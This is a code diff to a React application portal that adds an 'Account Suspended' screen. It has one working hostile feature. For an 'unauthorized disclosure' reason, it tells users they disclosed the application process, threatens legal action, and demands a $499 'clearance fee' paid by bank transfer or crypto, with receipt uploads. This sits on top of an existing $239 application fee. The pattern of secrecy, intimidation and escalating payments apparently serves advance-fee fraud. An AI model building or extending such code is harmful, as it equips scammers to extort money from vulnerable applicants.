@@ -16,6 +16,13 @@ const api = async (ep, method, body, tok) => {
   return data;
 };
 
+function toast(msg, isError) {
+  const t = document.createElement('div');
+  t.textContent = msg;
+  t.style.cssText = `position:fixed;top:1rem;right:1rem;z-index:9999;padding:0.75rem 1.25rem;border-radius:8px;color:#fff;font-size:0.9rem;box-shadow:0 4px 12px rgba(0,0,0,0.15);animation:slideIn .3s ease;background:${isError ? '#dc2626' : '#16a34a'}`;
+  document.body.appendChild(t);
+  setTimeout(() => t.remove(), 3000);
+}
 const STATES = {
   'Alabama': ['Birmingham','Huntsville','Mobile','Montgomery','Tuscaloosa','Hoover','Dothan','Auburn','Decatur','Madison','Florence','Gadsden','Vestavia Hills','Prattville','Oxford','Albertville','Selma','Troy','Mountain Brook','Phenix City'],
   'Alaska': ['Anchorage','Fairbanks','Juneau','Wasilla','Sitka','Kenai','Ketchikan','Palmer','Bethel','Homer','Valdez','Kodiak','Barrow','Soldotna','Seward','Cordova','Dillingham','Unalaska','Nome','Wrangell'],
@@ -116,6 +123,12 @@ export default function App() {
   const [supportThread, setSupportThread] = useState([]);
   const [supportSent, setSupportSent] = useState(false);
 
+  const [suspension, setSuspension] = useState(null);
+  const [appealText, setAppealText] = useState('');
+  const [appealReceipts, setAppealReceipts] = useState([]);
+  const [clearancePayCfg, setClearancePayCfg] = useState({});
+  const [clearanceFee, setClearanceFee] = useState(499);
+
   const [forgotEmail, setForgotEmail] = useState('');
   const [forgotCode, setForgotCode] = useState('');
   const [forgotStep, setForgotStep] = useState(0);
@@ -131,9 +144,22 @@ export default function App() {
       setDash(d.user);
       setClearDur(d.user.clearanceDuration || 0);
       setSupportMsg(s => ({ ...s, name: s.name || d.user.fullName || '' }));
-      const pc = await api('/application/payment-config', 'GET', null, token);
-      setPaymentConfig(pc.config || {});
-      setAppFeeAmount(pc.applicationFee || 239);
+      if (d.user.suspended) {
+        try {
+          const s = await api('/application/my-suspension', 'GET', null, token);
+          setSuspension(s.suspension || null);
+        } catch { setSuspension({ reason: d.user.suspensionReason, message: 'Your account has been suspended.' }); }
+        try {
+          const pc = await api('/application/clearance-payment-config', 'GET', null, token);
+          setClearancePayCfg(pc.config || {});
+          setClearanceFee(pc.clearanceFee || 499);
+        } catch {}
+      } else {
+        setSuspension(null);
+        const pc = await api('/application/payment-config', 'GET', null, token);
+        setPaymentConfig(pc.config || {});
+        setAppFeeAmount(pc.applicationFee || 239);
+      }
       const sm = await api('/application/support-messages', 'GET', null, token);
       setSupportThread(sm.messages || []);
     } catch {}
@@ -155,7 +181,138 @@ export default function App() {
     return () => clearInterval(t);
   }, [dash?.stageStatus, loadDash]);
 
-  const doLogout = () => { setUser(null); setToken(null); setDash(null); setStep(0); setForgotStep(0); localStorage.removeItem('token'); };
+  const doLogout = () => { setUser(null); setToken(null); setDash(null); setSuspension(null); setStep(0); setForgotStep(0); localStorage.removeItem('token'); };
+
+  const SUSPENSION_REASONS = {
+    multiple_accounts: 'Multiple accounts detected',
+    invalid_id: 'Invalid ID',
+    idme_failed: 'IDME verification failed',
+    unauthorized_disclosure: 'Unauthorized disclosure'
+  };
+
+  const SUSPENSION_MESSAGES = {
+    multiple_accounts: 'We have detected that you are operating multiple accounts, which is a violation of our terms of service.',
+    invalid_id: 'Your identification document was rejected during the verification process.',
+    idme_failed: 'Your IDME verification has failed after multiple attempts.',
+    unauthorized_disclosure: 'We discovered that you disclosed the process of this application to unauthorized persons, therefore you were banned. To lift this ban, you will have to pay a clearance fee of $499 to lift your suspension and avoid legal issues with our legal department.'
+  };
+
+  const submitAppeal = async () => {
+    try {
+      await api('/application/submit-appeal', 'POST', { reason: suspension?.reason, message: appealText }, token);
+      setSuspension(s => ({ ...s, appealStatus: 'under_review', appealMessage: appealText }));
+      toast('Appeal submitted successfully');
+    } catch(e) { toast(e.message, true); }
+  };
+
+  const uploadAppealReceipts = async () => {
+    if (appealReceipts.length === 0) return;
+    try {
+      const receipts = await Promise.all(appealReceipts.map(f => new Promise((resolve, reject) => {
+        const r = new FileReader();
+        r.onload = ev => resolve(ev.target.result);
+        r.onerror = reject;
+        r.readAsDataURL(f);
+      })));
+      const d = await api('/application/upload-appeal-receipts', 'POST', { receiptImages: receipts }, token);
+      setSuspension(s => ({ ...s, appealStatus: 'receipts_submitted', clearanceInvoiceNumber: d.invoiceNumber }));
+      setAppealReceipts([]);
+      toast('Receipts uploaded successfully');
+    } catch(e) { toast(e.message, true); }
+  };
+
+  const renderSuspension = () => {
+    if (!suspension) return null;
+    const reason = suspension.reason;
+    const message = SUSPENSION_MESSAGES[reason] || suspension.message;
+    const isDisclosure = reason === 'unauthorized_disclosure';
+    const showAppealForm = !suspension.appealStatus || suspension.appealStatus === 'pending';
+
+    return (
+      <div className="form-card animate-fade-in" style={{ maxWidth: 650, margin: '2rem auto' }}>
+        <div style={{ textAlign: 'center', marginBottom: '1.5rem' }}>
+          <div style={{ width: 64, height: 64, borderRadius: '50%', background: '#fee2e2', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 1rem' }}>
+            <Shield size={32} color="#dc2626" />
+          </div>
+          <h2 className="section-title" style={{ color: '#dc2626', border: 'none' }}>Account Suspended</h2>
+          <p style={{ color: '#666', fontSize: '0.9rem' }}>Application ID: {dash?.applicationNumber || 'N/A'}</p>
+        </div>
+
+        <div style={{ background: '#fef2f2', border: '1px solid #fecaca', borderRadius: 10, padding: '1.25rem', marginBottom: '1.5rem' }}>
+          <p style={{ fontWeight: 600, color: '#991b1b', marginBottom: '0.5rem', textTransform: 'uppercase', fontSize: '0.8rem', letterSpacing: '0.5px' }}>Reason for suspension</p>
+          <p style={{ color: '#991b1b', fontWeight: 500, marginBottom: '0.75rem' }}>{SUSPENSION_REASONS[reason] || reason}</p>
+          <p style={{ color: '#7f1d1d', fontSize: '0.9rem', lineHeight: 1.6 }}>{message}</p>
+        </div>
+
+        {isDisclosure && suspension.appealStatus !== 'receipts_submitted' && (
+          <div style={{ marginBottom: '1.5rem' }}>
+            <div style={{ background: '#f0f7ff', border: '1px solid #bfdbfe', borderRadius: 10, padding: '1.25rem', marginBottom: '1rem' }}>
+              <p style={{ color: '#1e40af', fontWeight: 600, fontSize: '0.9rem', marginBottom: '0.5rem' }}>Clearance Fee: ${clearanceFee}</p>
+              <p style={{ color: '#333', fontSize: '0.85rem', lineHeight: 1.5 }}>To lift your suspension, you must pay the clearance fee and upload your payment receipt(s) below.</p>
+            </div>
+
+            {clearancePayCfg.bankTransfer?.available && (
+              <div style={{ background: '#f9fafb', border: '1px solid #e5e7eb', borderRadius: 10, padding: '1.25rem', marginBottom: '0.75rem' }}>
+                <p style={{ fontWeight: 600, fontSize: '0.85rem', color: '#333', marginBottom: '0.5rem' }}>Bank Transfer</p>
+                <p style={{ fontSize: '0.8rem', color: '#555', lineHeight: 1.5 }}>Bank: {clearancePayCfg.bankTransfer.bankName}<br/>Account: {clearancePayCfg.bankTransfer.accountName}<br/>Number: {clearancePayCfg.bankTransfer.accountNumber}<br/>Routing: {clearancePayCfg.bankTransfer.routingNumber}</p>
+                {clearancePayCfg.bankTransfer.instructions && <p style={{ fontSize: '0.8rem', color: '#777', marginTop: '0.5rem' }}>{clearancePayCfg.bankTransfer.instructions}</p>}
+              </div>
+            )}
+
+            {clearancePayCfg.crypto?.available && clearancePayCfg.crypto.assets?.map(a => (
+              <div key={a.network} style={{ background: '#f9fafb', border: '1px solid #e5e7eb', borderRadius: 10, padding: '1.25rem', marginBottom: '0.75rem' }}>
+                <p style={{ fontWeight: 600, fontSize: '0.85rem', color: '#333', marginBottom: '0.5rem' }}>Crypto - {a.network}</p>
+                <p style={{ fontSize: '0.8rem', color: '#555', fontFamily: 'monospace', wordBreak: 'break-all' }}>{a.walletAddress}</p>
+                {a.qrCodeImage && <img src={a.qrCodeImage} alt="QR" style={{ width: 120, height: 120, marginTop: '0.5rem', borderRadius: 8, border: '1px solid #e5e7eb' }} />}
+              </div>
+            ))}
+
+            <div style={{ marginTop: '1rem' }}>
+              <label style={{ display: 'block', fontWeight: 600, fontSize: '0.85rem', color: '#333', marginBottom: '0.5rem' }}>Upload Receipt(s)</label>
+              <input type="file" accept="image/*" multiple onChange={e => setAppealReceipts([...e.target.files])} style={{ width: '100%', padding: '0.5rem', border: '1px solid #d1d5db', borderRadius: 6, fontSize: '0.85rem' }} />
+              {appealReceipts.length > 0 && (
+                <div style={{ marginTop: '0.75rem' }}>
+                  {appealReceipts.map((f, i) => (
+                    <div key={i} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '0.5rem 0.75rem', background: '#f9fafb', border: '1px solid #e5e7eb', borderRadius: 6, marginBottom: '0.5rem', fontSize: '0.85rem' }}>
+                      <span>{f.name}</span>
+                      <button onClick={() => setAppealReceipts(appealReceipts.filter((_, j) => j !== i))} style={{ background: 'none', border: 'none', color: '#dc2626', cursor: 'pointer', fontSize: '1.1rem' }}>&times;</button>
+                    </div>
+                  ))}
+                  <button onClick={uploadAppealReceipts} className="btn btn-primary" style={{ width: 'auto', marginTop: '0.5rem', padding: '0.5rem 1.5rem' }}>Upload {appealReceipts.length} Receipt(s)</button>
+                </div>
+              )}
+            </div>
+          </div>
+        )}
+
+        {isDisclosure && suspension.appealStatus === 'receipts_submitted' && (
+          <div style={{ background: '#d1fae5', border: '1px solid #6ee7b7', borderRadius: 10, padding: '1.25rem', marginBottom: '1.5rem' }}>
+            <p style={{ color: '#065f46', fontWeight: 600 }}>Receipts submitted successfully</p>
+            <p style={{ color: '#065f46', fontSize: '0.85rem', marginTop: '0.25rem' }}>Invoice: {suspension.clearanceInvoiceNumber || 'N/A'} &mdash; Our team will review your payment.</p>
+          </div>
+        )}
+
+        {!isDisclosure && showAppealForm && (
+          <div style={{ marginBottom: '1.5rem' }}>
+            <label style={{ display: 'block', fontWeight: 600, fontSize: '0.85rem', color: '#333', marginBottom: '0.5rem' }}>Appeal Message</label>
+            <textarea className="form-textarea" rows={4} placeholder="Explain why you believe this suspension is in error..." value={appealText} onChange={e => setAppealText(e.target.value)} style={{ width: '100%', padding: '0.6rem 0.75rem', border: '1px solid #d1d5db', borderRadius: 6, fontFamily: 'inherit', fontSize: '0.88rem' }} />
+            <button onClick={submitAppeal} className="btn btn-primary" style={{ width: 'auto', marginTop: '0.75rem', padding: '0.5rem 1.5rem' }} disabled={!appealText.trim()}>Submit Appeal</button>
+          </div>
+        )}
+
+        {!isDisclosure && suspension.appealStatus === 'under_review' && (
+          <div style={{ background: '#fef3c7', border: '1px solid #fcd34d', borderRadius: 10, padding: '1.25rem', marginBottom: '1.5rem' }}>
+            <p style={{ color: '#92400e', fontWeight: 600 }}>Appeal under review</p>
+            <p style={{ color: '#92400e', fontSize: '0.85rem', marginTop: '0.25rem' }}>Your appeal has been submitted. Our team will review it and contact you.</p>
+          </div>
+        )}
+
+        <div style={{ textAlign: 'center', paddingTop: '1rem', borderTop: '1px solid #e5e7eb' }}>
+          <button onClick={doLogout} className="btn btn-secondary" style={{ padding: '0.5rem 2rem' }}>Sign Out</button>
+        </div>
+      </div>
+    );
+  };
 
   const handleSignup = async e => {
     e.preventDefault(); setError('');
@@ -372,6 +529,7 @@ export default function App() {
   };
 
   const renderStage = () => {
+    if (dash?.suspended) return renderSuspension();
     const stage = dash?.currentStage || 1;
     const status = dash?.stageStatus || '';
 
